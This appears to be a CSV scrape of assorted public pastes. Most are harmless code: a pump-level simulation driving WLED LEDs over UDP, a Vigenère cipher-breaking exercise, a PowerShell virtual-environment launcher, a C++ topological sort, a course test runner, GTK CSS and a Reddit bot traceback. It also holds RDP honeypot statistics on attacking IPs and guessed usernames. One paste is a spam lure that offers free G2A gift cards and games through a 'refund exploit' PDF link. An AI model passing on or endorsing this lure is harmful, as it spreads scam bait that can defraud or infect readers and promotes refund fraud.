id,title,username,language,date,content
xn2bcVwJ,2024-03-02_stats.json,rdp_snitch,JSON,Saturday 2nd of March 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""103.143.207.200"": 421,
    ""120.240.145.8"": 1,
    ""98.159.37.36"": 1,
    ""87.251.75.145"": 4,
    ""167.94.138.49"": 1,
    ""205.210.31.222"": 3,
    ""45.227.254.9"": 1,
    ""92.51.2.11"": 1,
    ""87.251.75.64"": 1,
    ""81.19.135.2"": 3,
    ""185.170.144.3"": 3,
    ""185.161.248.148"": 1,
    ""212.70.149.142"": 3,
    ""62.204.41.107"": 6,
    ""194.165.16.37"": 2,
    ""81.19.135.47"": 3,
    ""194.165.16.78"": 2,
    ""67.211.213.146"": 1,
    ""198.235.24.67"": 3,
    ""36.91.222.100"": 2,
    ""213.109.202.232"": 3,
    ""109.205.162.12"": 1,
    ""49.157.28.24"": 1,
    ""185.129.51.52"": 1,
    ""120.89.61.118"": 3,
    ""103.120.18.138"": 2,
    ""165.154.100.42"": 1,
    ""176.113.115.58"": 1,
    ""212.70.149.146"": 1,
    ""205.210.31.212"": 3,
    ""165.227.4.71"": 4,
    ""138.68.8.233"": 1,
    ""45.227.254.54"": 2,
    ""194.165.16.73"": 2,
    ""136.144.35.136"": 1,
    ""172.232.251.69"": 270,
    ""205.210.31.169"": 3
  },
  ""asn"": {
    ""AS18403"": 421,
    ""AS56040"": 1,
    ""AS62240"": 1,
    ""AS208091"": 5,
    ""AS398324"": 1,
    ""AS396982"": 12,
    ""AS267784"": 3,
    ""AS209588"": 7,
    ""AS197414"": 3,
    ""AS49202"": 1,
    ""AS204428"": 4,
    ""AS59425"": 6,
    ""AS48721"": 6,
    ""AS19318"": 1,
    ""AS7713"": 2,
    ""AS208312"": 3,
    ""AS196961"": 1,
    ""AS9658"": 4,
    ""AS200532"": 1,
    ""AS131939"": 2,
    ""AS135377"": 1,
    ""AS57678"": 1,
    ""AS14061"": 5,
    ""AS396356"": 1,
    ""AS63949"": 270
  },
  ""isp"": {
    ""Vietnam Internet Network Information Center"": 421,
    ""China Mobile communications corporation"": 1,
    ""LogicWeb Inc."": 1,
    ""Xhost Internet Solutions LP"": 8,
    ""Censys, Inc."": 1,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 16,
    ""Kisara LLC"": 1,
    ""SS-Net"": 4,
    ""Horizon LLC"": 6,
    ""Interserver, Inc"": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Red Byte LLC"": 3,
    ""Teleport IP BLK1"": 1,
    ""Eastern Telecommunications Philippines, Inc."": 4,
    ""LLP \""Kompaniya Hoster.KZ\"""": 1,
    ""IPS INC"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Cat Technologies Co. Limited"": 1,
    ""DigitalOcean, LLC"": 5,
    ""Latitude.sh"": 1,
    ""Akamai Technologies, Inc."": 270
  },
  ""org"": {
    ""Everest Global Joint Stock Company"": 421,
    ""China Mobile"": 1,
    ""Dedicated Servers"": 1,
    ""Xhost Internet Solutions"": 5,
    ""Censys, Inc"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 3,
    ""Alviva Holding Limited"": 7,
    ""Xhostis"": 3,
    ""Kisara LLC"": 1,
    ""4Media Ltd"": 4,
    ""Horizon LLC"": 6,
    ""Flyservers S.A"": 6,
    ""Interserver, Inc"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unknown"": 1,
    ""DSL Network"": 1,
    ""Hosterkz Network"": 1,
    ""Eastern Telecommunications Philippines, Inc"": 3,
    ""IPS Inc"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Cat Technologies Co. Limited"": 1,
    ""DigitalOcean, LLC"": 5,
    ""Panq B.V"": 1,
    ""Akamai Technologies, Inc."": 270
  },
  ""regionName"": {
    ""Hanoi"": 421,
    ""Guangdong"": 1,
    ""California"": 18,
    ""North Holland"": 8,
    ""Michigan"": 1,
    ""Vilnius"": 3,
    ""Moscow"": 12,
    ""Hesse"": 6,
    ""Plovdiv"": 4,
    ""Kaunas"": 6,
    ""New Jersey"": 2,
    ""Jakarta"": 272,
    ""Baku City"": 1,
    ""Metro Manila"": 5,
    ""Karaganda"": 1,
    ""Tokyo"": 2
  },
  ""country"": {
    ""Vietnam"": 421,
    ""China"": 1,
    ""United States"": 21,
    ""The Netherlands"": 8,
    ""Lithuania"": 9,
    ""Russia"": 12,
    ""Germany"": 6,
    ""Bulgaria"": 4,
    ""Indonesia"": 272,
    ""Azerbaijan"": 1,
    ""Philippines"": 5,
    ""Kazakhstan"": 1,
    ""Japan"": 2
  },
  ""account"": {
    ""hello"": 430,
    ""(empty)"": 5,
    ""Administr"": 14,
    ""UQIiIQUeP"": 1,
    ""ezHOWp"": 1,
    ""gidtYk"": 1,
    ""Domain"": 13,
    ""Test"": 13,
    ""XPsNYPvUr"": 1,
    ""VPyMNY"": 1,
    ""HgSoKl"": 1,
    ""Administrator"": 46,
    ""NSdwLqpBo"": 1,
    ""cOlzei"": 1,
    ""HutKsB"": 1,
    ""5nppoyby"": 4,
    ""beio"": 1,
    ""Admin"": 45,
    ""Whatuptime.com"": 45,
    ""Jakartakini123#"": 45,
    ""Student"": 45,
    ""Azureuser"": 45,
    ""XMIhtHIkf"": 1,
    ""wOlksU"": 1,
    ""OmmwdK"": 1
  },
  ""keyboard"": {
    ""Unknown"": 763
  },
  ""client_build"": {
    ""Unknown"": 763
  },
  ""client_name"": {
    ""Unknown"": 763
  },
  ""ip_type"": {
    ""Unknown"": 468,
    ""mobile"": 1,
    ""hosting & proxy"": 7,
    ""hosting"": 284,
    ""proxy"": 3
  }
}"
8uayhNaf,pumpe2.py,DeaD_EyE,Python,Saturday 2nd of March 2024 06:13:59 PM CDT,"import time
from enum import Enum
from dataclasses import dataclass, field

from rich import get_console
from rich.live import Live
from rich.table import Table

from wled import set_level


console = get_console()


def get_status(step, height, status) -> Table:
    table = Table()
    table.add_row(""Step"", str(step))
    table.add_row(""Height"", f""{height:.2f}"")
    table.add_row(""Status"", str(status))
    return table


class Direction(str, Enum):
    a_to_b = ""A to B""
    b_to_a = ""B to A""


@dataclass
class Height:
    min : int | float
    max : int | float
    step : int | float = field(default=1)

    def __post_init__(self):
        self._value = 50.0
        console.print(""Height measurement initialized"")
        console.print(f""Min-Height: {self.min} mm"")
        console.print(f""Max-Height: {self.max} mm"")
        console.print(f""Step: {self.step} mm"")
        console.print(f""Value: {self.value:.2f} mm"")

    @property
    def value(self) -> int | float:
        return self._value

    @value.setter
    def value(self, value):
        console.print(""Setting new height to:"", value)
        self._value = value

    @property
    def ok(self) -> bool:
        return self.min <= self.value <= self.max

    @property
    def min_ok(self) -> bool:
        return self.min < self.value

    @property
    def max_ok(self) -> bool:
        return self.max > self.value

    def update(self, direction: Direction | None) -> int | float:
        if direction is Direction.a_to_b:
            self._value -= self.step
        elif direction is Direction.b_to_a:
            self._value += self.step


@dataclass
class Pumpe:
    name : str

    def __post_init__(self):
         self._state = None
         console.print(f""Created {self.name}."")

    @property
    def state(self) -> Direction:
        return self._state

    def a_to_b(self):
        self._state = Direction.a_to_b
        # console.print(f""{self.name}: {self._state.value}"")

    def b_to_a(self):
        self._state = Direction.b_to_a
        # console.print(f""{self.name}: {self._state.value}"")

    def stop(self):
        self._state = None
        # console.print(f""{self.name}: Stop"")



def main(live):
    delay = 0.005
    step_size = (140 / 14) * delay
    console.print(f""Simulation with step_size of {step_size:.2f} and a delay of {delay:.3f}s"")

    height = Height(min=15.0, max=100.0, step=step_size)
    height.value = 100.0

    pumpe = Pumpe(""Pupe 1"")

    console.print(""Starting main loop"")
    step = 0
    timer = 1.0

    while True:
        time.sleep(delay)

        height.update(pumpe.state)
        # console.print(f""Height: {height.value:.2f}"")
        # console.print(""\nStep:"", step)
        live.update(get_status(step, height.value, pumpe.state))
        set_level(height.value, min_value=0.0, max_value=140.0)

        #  0 [      start  ] -> Pumpe stoppen | ->  1

        #              Verzweigung
        #  1 [      max_ok ] -> Von b nach a  | -> 10
        #  1 [ not max_ok  ] -> Von a nach b  | -> 20

        #              von b nach a
        # 10 [ not max_ok  ] -> Pumpe stoppen | -> 11
        # 11 [ time 4 s    ] ->               | -> 20

        #              von a nach b
        # 20 [             ] -> Von a nach b  | -> 21
        # 21 [  not min_ok ] -> Pumpe stoppen | -> 30

        # 30 [             ] ->               | ->  0

        match step:
            case 0:
                step = 1
                pumpe.stop()
                input(""Enter to start: "")
                console.clear()

            case 1 if height.max_ok:
                step = 10
                pumpe.b_to_a()

            case 1 if not height.max_ok:
                step = 20
                pumpe.a_to_b()

            case 10 if not height.max_ok:
                step = 11
                pumpe.stop()

            case 11:
                step = 20
                # console.print(f""Delay of {timer}s"")
                time.sleep(timer)

            case 20:
                step = 21
                pumpe.a_to_b()

            case 21 if not height.min_ok:
                step = 30
                pumpe.stop()

            case 30:
                step = 0


if __name__ == ""__main__"":
    console.print(""Starting simulation"")
    try:
        with Live(refresh_per_second=60) as live:
            main(live)
    except KeyboardInterrupt:
        print()

"
hkDAYEfY,Untitled,nicoviale_,Python,Saturday 2nd of March 2024 05:54:51 PM CDT,"ENGLISHFREQ = {
    'A': 0.082, 'B': 0.015, 'C': 0.028, 'D': 0.043, 'E': 0.127, 'F': 0.022, 'G': 0.020, 
    'H': 0.061, 'I': 0.070, 'J': 0.002, 'K': 0.008, 'L': 0.040, 'M': 0.024, 'N': 0.067, 
    'O': 0.075, 'P': 0.019, 'Q': 0.001, 'R': 0.060, 'S': 0.063, 'T': 0.091, 'U': 0.028, 
    'V': 0.010, 'W': 0.023, 'X': 0.001, 'Y': 0.020, 'Z': 0.001
}

ciphertext=input()

#mappa la frequenza di ogni lettera in una data stringa
def frequency(ciphertext):
    freq = {chr(i + ord('A')): 0 for i in range(26)}

    for char in ciphertext:
        freq[char] += 1

    return freq

#taglia la stringa tenendo solo i caratteri che sono in una posizione multipla del modulo dato
#(per selezionare con shift di 1 basta togliere il primo carattere e passare quello alla funzione, eccetera)
def split_string(s,mod):
    return s[::mod]

#ricerca nelle coppie lo shift che ha generato il lambda maggiore
def find_max_M(possibili_shift):
    return max(possibili_shift, key=lambda pair: pair[1])

#trova tutti gli shift e i loro relativi m, restituisce quello con l'm piu grande
def get_shift_of_best_M(stringa):
    n=len(stringa)

    possibili_shift=[]

    #array frequenze
    frequenzaRiscontrata=[]
    for key in ENGLISHFREQ:
        frequenzaRiscontrata.append(stringa.count(key))

    #calcolo indice di mutua coincidenza per ogni g(shift) possibile
    for g in range(0,26):    
        M=0
        i=0
        for key,value  in ENGLISHFREQ.items():
            M+=(value*frequenzaRiscontrata[(i+g)%26])/n
            i+=1
        possibili_shift.append((g,M))
    
    #trovo il maggiore shift
    max_pair = find_max_M(possibili_shift)

    return(max_pair[0])




#supposta lunghezza della chiave
key_len = 8  #siuuuuuuu

#lista di sottostringhe
substrings = []

#ricavo le sottostringhe tagliando a intervalli regolari la stringa iniziale
for i in range(0,key_len):
    substrings.append(split_string(ciphertext[i:],key_len))

print(substrings)

#stampo le frequenze per ogni substring(non utilizzato ma utile per debug)
freq_list = [(frequency(substring)) for substring in substrings]

print(freq_list)

shift_list=[0]*key_len

#calcolo lo shift migliore per ogni sottostringa 
for i in range(0,key_len):
    shift_list[i]=get_shift_of_best_M(substrings[i])

print(shift_list)


#chr(65) -> A
#ord('a')-> 97

final_array=['*']*len(ciphertext)
i=0
#ciclo ogni lettera e faccio la sostituzione con la relativa chiave
for letter in ciphertext:
    final_array[i]=chr(ord('A')+ (ord(letter)-ord('A')-shift_list[i%key_len])%26)
    i+=1

#converto l'array in una stringa per la stampa finale
stringa_output= ''.join(final_array)

print(stringa_output)
"
VbWUYMH1,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Saturday 2nd of March 2024 05:48:15 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_172209.pdf

Working as of:
02 March 2024"
EACV1n8g,wled.py,DeaD_EyE,Python,Saturday 2nd of March 2024 05:32:23 PM CDT,"import atexit

from struct import Struct
from socket import socket, AF_INET, SOCK_DGRAM
from itertools import chain


WLED_ADDR = (""192.168.0.215"", 21324)
sock = socket(AF_INET, SOCK_DGRAM)

atexit.register(sock.close)


def set_leds(colors, addr=WLED_ADDR):
    if len(colors) > 490:
        raise ValueError(""Too many LEDs"")

    leds = chain.from_iterable(colors)
    data_len = len(colors) * 3
    proto = 2
    delay = 10

    # Protokoll 2 == RGB

    # Protokoll, Timeout, [Rn,Gn,Bn], ... 
    st = Struct(f""!BB{data_len}B"")
    sock.sendto(st.pack(proto, delay, *leds), WLED_ADDR)


def set_level(value, /, min_value=0, max_value=140, leds=72):
    relative = (value - min_value) / (max_value - min_value)

    on_count = round(relative * leds)
    off_count = leds - on_count

    r = min(255, max(0, int(relative * 255)))
    g = 0
    b = 255 - r

    color = (r , g , b)
    colors = [color] * on_count + [(0, 0, 0)] * off_count

    set_leds(colors)


if __name__ == ""__main__"":
    try:
        while True:
            set_level(float(input(""Value: "")))
    except KeyboardInterrupt:
        pass
    except ValueError:
        pass
"
qKAjC0r8,Pumpe,DeaD_EyE,Python,Saturday 2nd of March 2024 05:31:49 PM CDT,"import time
from enum import Enum
from dataclasses import dataclass, field

from rich import get_console

from wled import set_level


console = get_console()


class Direction(str, Enum):
    a_to_b = ""A to B""
    b_to_a = ""B to A""


@dataclass
class Height:
    min : int | float
    max : int | float
    step : int | float = field(default=1)

    def __post_init__(self):
        self._value = 50.0
        console.print(""Height measurement initialized"")
        console.print(f""Min-Height: {self.min} mm"")
        console.print(f""Max-Height: {self.max} mm"")
        console.print(f""Step: {self.step} mm"")
        console.print(f""Value: {self.value:.2f} mm"")

    @property
    def value(self) -> int | float:
        return self._value

    @value.setter
    def value(self, value):
        console.print(""Setting new height to:"", value)
        self._value = value

    @property
    def ok(self) -> bool:
        return self.min <= self.value <= self.max

    @property
    def min_ok(self) -> bool:
        return self.min < self.value

    @property
    def max_ok(self) -> bool:
        return self.max > self.value

    def update(self, direction: Direction | None) -> int | float:
        if direction is Direction.a_to_b:
            self._value -= self.step
        elif direction is Direction.b_to_a:
            self._value += self.step


@dataclass
class Pumpe:
    name : str

    def __post_init__(self):
         self._state = None
         console.print(f""Created {self.name}."")

    @property
    def state(self) -> Direction:
        return self._state

    def a_to_b(self):
        self._state = Direction.a_to_b
        console.print(f""{self.name}: {self._state.value}"")

    def b_to_a(self):
        self._state = Direction.b_to_a
        console.print(f""{self.name}: {self._state.value}"")

    def stop(self):
        self._state = None
        console.print(f""{self.name}: Stop"")



def main():
    delay = 0.01
    step_size = (140 / 14) * delay
    console.print(f""Simulation with step_size of {step_size:.2f} and a delay of {delay:.3f}s"")

    height = Height(min=15.0, max=100.0, step=step_size)
    height.value = 100.0

    pumpe = Pumpe(""Pupe 1"")

    console.print(""Starting main loop"")
    step = 0
    timer = 1.0

    while True:
        time.sleep(delay)

        height.update(pumpe.state)
        console.print(f""Height: {height.value:.2f}"")
        console.print(""\nStep:"", step)   
        set_level(height.value, min_value=0.0, max_value=140.0)

        #  0 [      start  ] -> Pumpe stoppen | ->  1

        #              Verzweigung
        #  1 [      max_ok ] -> Von b nach a  | -> 10
        #  1 [ not max_ok  ] -> Von a nach b  | -> 20

        #              von b nach a
        # 10 [ not max_ok  ] -> Pumpe stoppen | -> 11
        # 11 [ time 4 s    ] ->               | -> 20

        #              von a nach b
        # 20 [             ] -> Von a nach b  | -> 21
        # 21 [  not min_ok ] -> Pumpe stoppen | -> 30

        # 30 [             ] ->               | ->  0

        match step:
            case 0:
                step = 1
                pumpe.stop()
                input(""Enter to start: "")

            case 1 if height.max_ok:
                step = 10
                pumpe.b_to_a()

            case 1 if not height.max_ok:
                step = 20
                pumpe.a_to_b()

            case 10 if not height.max_ok:
                step = 11
                pumpe.stop()

            case 11:
                step = 20
                console.print(f""Delay of {timer}s"")
                time.sleep(timer)

            case 20:
                step = 21
                pumpe.a_to_b()

            case 21 if not height.min_ok:
                step = 30
                pumpe.stop()

            case 30:
                step = 0


if __name__ == ""__main__"":
    console.print(""Starting simulation"")
    try:
        main()
    except KeyboardInterrupt:
        print()

"
cQXyhqEH,TooManyRequests: received 429 HTTP response,Vault-TecTradingCo,Python,Saturday 2nd of March 2024 04:10:01 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/main.py"", line 258, in main
    for comment in comment_stream:
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/util.py"", line 138, in stream_generator
    for item in reversed(list(function(limit=limit, **function_kwargs))):
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 63, in __next__
    self._next_batch()
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = self._reddit.get(self.url, params=self.params)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 712, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 517, in _objectify_request
    self.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/util/deprecate_args.py"", line 43, in wrapped
    return func(**dict(zip(_old_args, args)), **kwargs)
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/lib/python3.10/site-packages/praw/reddit.py"", line 941, in request
    return self._core.request(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/src/prawcore/prawcore/sessions.py"", line 325, in request
    return self._request_with_retries(
  File ""/root/Bots/Fallout76MarketplaceKarmaTransferBot/venv/src/prawcore/prawcore/sessions.py"", line 264, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status_code](response)
prawcore.exceptions.TooManyRequests: received 429 HTTP response
"
e5mSpYUW,Untitled,paul_nicholls,Pascal,Saturday 2nd of March 2024 03:33:27 PM CDT,"type
  TVIC = record
    spr0_x      : Byte;
    spr0_y      : Byte;
    spr1_x      : Byte;
    spr1_y      : Byte;
    spr2_x      : Byte;
    spr2_y      : Byte;
    spr3_x      : Byte;
    spr3_y      : Byte;
    spr4_x      : Byte;
    spr4_y      : Byte;
    spr5_x      : Byte;
    spr5_y      : Byte;
    spr6_x      : Byte;
    spr6_y      : Byte;
    spr7_x      : Byte;
    spr7_y      : Byte;
    spr_hi_x    : Byte;
    cr1         : Byte;
    raster      : Byte;
    lp_x        : Byte;
    lp_y        : Byte;
    spr_ena     : Byte;
    cr2         : Byte;
    spr_exp_y   : Byte;
    mem         : Byte;
    irq         : Byte;
    irq_ena     : Byte;
    spr_dp      : Byte;
    spr_mcolor  : Byte;
    spr_exp_x   : Byte;
    spr_ss_col  : Byte;
    spr_sd_col  : Byte;
    border      : Byte;
    bg_color0   : Byte;
    bg_color1   : Byte;
    bg_color2   : Byte;
    bg_color3   : Byte;
    spr_color1  : Byte;
    spr_color2  : Byte;
    spr0_color  : Byte;
    spr1_color  : Byte;
    spr2_color  : Byte;
    spr3_color  : Byte;
    spr4_color  : Byte;
    spr5_color  : Byte;
    spr6_color  : Byte;
    spr7_color  : Byte;
  end;

var
  vic   : TVIC absolute $d000;
begin
  vic.border    := white;
  vic.bg_color0 := dark_grey;

"
XjpfT97Z,[ps] script to run python in venv,alaestor,PowerShell,Saturday 2nd of March 2024 03:01:49 PM CDT,"<#
.SYNOPSIS
	Creates and activates virtual environment, installs requirements, and
	runs a python script. See ""Get-Help path-to-script.ps1 -detailed"".
.DESCRIPTION
	This script will perform the following actions:

	1. changes the current working directory.
	2. creates and activates a python virtual environment.
	3. pip installs requirements file if it exist.
	4. runs the entrypoint python script with optional arguments.
	5. reverts to the original working directory when finished.

	The default arguments were set up for a particular use-case: they can be
	easily changed by editing the ""[CmdletBinding()]"" portion of this script.

	Note: If you're using pyenv make sure a global python is configured, or
	that a valid "".python-version"" file is present in the working_directory.
.PARAMETER working_directory
	-wd <String> (default: ""./src/"")
	The working directory for the script.
.PARAMETER virtual_environment
	-venv <String> (default: ""../.venv/"")
	The path to a virtual environment folder.
	May be absolute or relative to the working_directory argument.
	If the folder or its activate script doesn't exist, it will be created.
.PARAMETER requirements
	-r <String> (default: ""requirements.txt"")
	The path to a pip-compatible requirements file.
	May be absolute or relative to the working_directory argument.
	For ease of use, it's not an error if the file doesn't exist.
.PARAMETER entrypoint
	-py <String>
	Filepath to the python script to be executed.
	May be absolute or relative to the working_directory argument.
.PARAMETER launch_args
	-args <String[]>
	Arguments that will be forwarded to the executable. (None if empty)
.PARAMETER dry_run
	-dry
	When this argument is present, the entrypoint will not be launched.
	Instead, only a message will be printed.
.PARAMETER verbose
	Print verbose logging and debug details (Powershell feature)
.NOTES
	Author: Alaestor Weissman
	Discord: honshitsu
	Date: 2024-03
	SemVer: 0.1.0
#>

[CmdletBinding()]
Param(
	[ValidateScript({
		if (-Not (Test-Path -LiteralPath $_ ) )
			{ throw ""Working Directory folder doesn't exist."" }
		return $true
	})]
	[String] [Alias(""wd"")] $working_directory = ""./src/"",

	[ValidateNotNullorEmpty ()]
	[String] [Alias(""venv"")] $virtual_environment = ""../.venv/"",

	[ValidateScript({
		if ([System.IO.Path]::IsPathRooted($_)) {
			$t = $_
		}
		else {
			$t = Join-Path -Path $working_directory -ChildPath $_
		}
		if (-Not (Test-Path -LiteralPath $t ) )
			{ throw ""Entrypoint doesn't exist."" }
		elseif (-Not (Test-Path -LiteralPath $t -PathType Leaf) )
			{ throw ""Entrypoint is not a file."" }
		return $true
	})]

	[ValidateNotNullorEmpty ()]
	[String] [Alias(""py"")] $entrypoint = ""main.py"",

	[ValidateNotNullorEmpty ()]
	[String] [Alias(""r"")] $requirements = ""requirements.txt"",

	[String[]] [Alias(""args"")] $launch_args=@(""""),

	[Switch] [Alias(""dry"")] $dry_run
)

$original_cwd = (Get-Item .).FullName
$debug = $DebugPreference -ne ""SilentlyContinue""

function main {
	try
	{
		Write-Verbose ((
			""State"",
			""---"",
			""OWD: $original_cwd"",
			""CWD: $working_directory"",
			""DRY: $($dry_run.IsPresent)"",
			""ENT: $entrypoint"",
			""ARG: $launch_args"",
			""REQ: $requirements"",
			""DBP: $DebugPreference"",
			""---""
		)-join(""`n""))

		# Enter the working directory
		Set-Location -LiteralPath $working_directory

		# Create and Activate the virtual environment
		InitializeVirtualEnvironment($virtual_environment)

		# Install requirements if they exist (suppressing boolean output)
		[Void]$(InstallRequirements($requirements))

		# Execute the target python script
		if ($dry_run.IsPresent){
			Write-Host ""Execution was prevented (dry_run). Would have run:""
			Write-Host $entrypoint @launch_args
		}
		else {
			python $entrypoint @launch_args
		}
	}
	catch
	{
		$Host.UI.WriteErrorLine((
			""---------------"",
			""---  ERROR  ---"",
			""---------------""
			) -join ""`n""
		)
		if ($debug) {
			$_ | Format-List * -Force
			$_.InvocationInfo | Format-List *
		}
		else {
			$Host.UI.WriteErrorLine(((
					[String]$_.CategoryInfo,
					[String]$_.Exception.ErrorRecord,
					[String]$_.InvocationInfo.PositionMessage
				) -join ""`n""
			))
		}
		$Host.UI.WriteErrorLine(""---------------"")
	}
	finally
	{
		# Return to the original working directory
		Set-Location -LiteralPath $original_cwd

		# Exit virtual environment if the command to do so is available
		if ((Get-Command ""deactivate"" -ErrorAction SilentlyContinue) -ne $null) {
			deactivate
		}
	}

	Exit
}

# Creates and activates the virtual environment folder. Throws on error
function InitializeVirtualEnvironment($folderpath) {
	# Ensure we have python
	if ((Get-Command ""python"" -ErrorAction SilentlyContinue) -eq $null) {
		throw ""Python was not found""
	}

	$activate = Join-Path -Path $folderpath -ChildPath ""Scripts\Activate.ps1""

	# Create virtual environment if it doesn't already exist
	if (-not (Test-Path $activate)) {
		python -m venv $folderpath
		if ($LastExitCode -ne 0) {
			throw ""Failed to create virtual environment""
		}
	}

	# Ensure virtual environment's activate script exist
	if (-not (Test-Path $activate)) {
		throw ""Virtual environment or activate script not found""
	}

	# Activate virtual environment
	& $activate

	# Ensure Python is running in a virtual environment
	python -c 'import sys;sys.exit(0 if sys.prefix != sys.base_prefix else -1)'
	if ($LastExitCode -ne 0) {
		throw ""Python appears to not be running in a virtual environment""
	}
}

# Returns true if successful, false if file not found. Throws on error
function InstallRequirements($filepath) {
	if (Test-Path $filepath) {
		pip install -r $filepath --quiet --disable-pip-version-check
		if ($LastExitCode -ne 0) {
			throw ""Failed to install the requirements from $filepath""
		}
		return $true
	}
	return $false
}

main
"
4r88tU7D,Untitled,Derga,C++,Saturday 2nd of March 2024 02:58:11 PM CDT,"#include <algorithm>
#include <iostream>
#include <queue>
#include <vector>

using namespace std;

void Dfs(const vector<vector<int>>& edges, vector<bool>& is_visited, int start, vector<int>& v) {
    is_visited[start] = true;
    for (int node2 : edges[start]) {
        if (is_visited[node2]) continue;
        Dfs(edges, is_visited, node2, v);
    }

    v.push_back(start);
}

int main() {
    int nodes_count, edges_count;
    cin >> nodes_count >> edges_count;

    vector<vector<int>> edges(1 + nodes_count);
    for (int i = 0; i < edges_count; ++i) {
        int node1, node2;
        cin >> node1 >> node2;
        edges[node1].push_back(node2);
    }

    vector<bool> is_visited(edges.size(), false);
    vector<int> v;
    for (int i = 1; i < is_visited.size(); ++i) {
        if (is_visited[i]) continue;

        Dfs(edges, is_visited, i, v);
    }

    reverse(begin(v), end(v));
    for (auto node : v) cout << node << ' ';

    return 0;
}
/*
test1
6 6
1 2
3 2
4 2
2 5
6 5
4 6

4 5 3 1 6 2 
*/"
z1nC4aQM,run_all_tests,AHDog,Python,Saturday 2nd of March 2024 02:53:34 PM CDT,"""""""
CSCI 447 Assignment 5 test case runner
By Sky Duryee
@ahdog on Discord

Run this Python file while cd into the `os` folder
of your assignment.

I tried my best but in the worst case 
scenario this could end up deleting TestProgram3.k. 
So be prepared to restore it.
""""""

import tempfile
import shutil
import os
import subprocess

# constants
# test output location
OUTPUT = ""test_results.txt""
# tempfile location
TEMP = ""/tmp/a5_run_all_tests_12032.txt""
# the starting line number of TestProgram3.k where the tests are
TEST_START = 27
# the number of different test cases in TestProgram3.k
NUM_TESTS = 13

# runs the test_num'th test.
# the index of the test is 0-based.
# returns a string of the output.
def run_test(test_num) -> str:
    with open(""TestProgram3.k"", mode=""r"") as testf:
        lines = list(testf)
    origlines = lines.copy()
    print(lines[0])
    
    test_index = TEST_START + test_num - 1
    test_name = lines[test_index].replace(""--"", """").strip()
    print()
    print(f""&&&&&&&&& run_all_tests.py: Running test {test_num}: {test_name} &&&&&&&&&"")

    # comment out all test lines
    for i in range(TEST_START-1, TEST_START+NUM_TESTS-1):
        lines[i] = ""--"" + lines[i]
    
    #print(f""Lines of file:\n {''.join(lines)}"")


    # uncomment the line of that specific test
    lines[test_index] = lines[test_index].replace(""--"", """")

    with open(""TestProgram3.k"", mode=""w"") as testf:
        try:
            # write back to file
            testf.writelines(lines)
            testf.flush()
    
            # make
            subprocess.run(""make"", check=True)

            # run program
            # write output to shell and to TEMP
            subprocess.run(f""blitz -g os 2>&1 | tee {TEMP}"", shell=True, text=True, check=True, stderr=subprocess.STDOUT)
            # get output from TEMP
            with open(TEMP, mode=""r"") as tempf:
                return tempf.read()
        finally:
            # write back original data to file when done
            testf.truncate(0)
            testf.seek(0)
            testf.writelines(origlines)
        
# run all tests and save to OUTPUT 
with open(OUTPUT, mode=""w"") as out:
    for i in range(NUM_TESTS):
        test_result: str = run_test(i)

        # remove stuff after **** so it looks like desired output
        end = test_result.rfind(""*****"")
        assert end != -1
        end += 5
        test_result = test_result[:end]

        # Remove first line so it looks like desired output
        test_result = ""\n"".join(test_result.splitlines()[1:])

        out.write(test_result)
        out.write(""\n\n\n"")
        out.flush()

print(""Finished running all tests!"")"
qnzCAxMv,gtk.css,Rnery,CSS,Saturday 2nd of March 2024 02:07:27 PM CDT,"/* 
    ###################################
    ## Customgtk-3.0 css definitions ##
    ###################################
*/

/* notify buttons */
#showdesktop-button image {
    -gtk-icon-transform: scale(1);
}
#pulseaudio-button image {
    -gtk-icon-transform: scale(0.5);
}
#xfce4-clipman-plugin image {
    -gtk-icon-transform: scale(0.5);
}
#xfce4-notification-plugin image {
    -gtk-icon-transform: scale(0.5);
}
#xfce4-power-manager-plugin image {
    -gtk-icon-transform: scale(0.6);
}
#xfce-panel-toggle-button image {
    -gtk-icon-transform: scale(0.6);
}

/* shrink headerbars */
headerbar {
    border: 0;
    background-color: #2d2d2d;
    border-radius: 0;
    min-height: 0;
    padding-left: 2px; /* same as childrens vertical margins for nicer proportions */
    padding-right: 2px;
}
headerbar entry,
headerbar spinbutton,
headerbar button,
headerbar separator {
    margin-bottom: 0;
    margin-top: 0; /* same as headerbar side padding for nicer proportions */
}

/* shrink ssd titlebars */
.default-decoration {
    background-color: #2d2d2d;
    min-height: 0; /* let the entry and button drive the titlebar size */
    padding: 0;
}
.default-decoration .titlebutton {
    min-height: 0; /* tweak these two props to reduce button size */
    min-width: 0;
}
window.ssd headerbar.titlebar {
    min-height: 0;
    padding-top: 3px;
    padding-bottom: 3px;
}
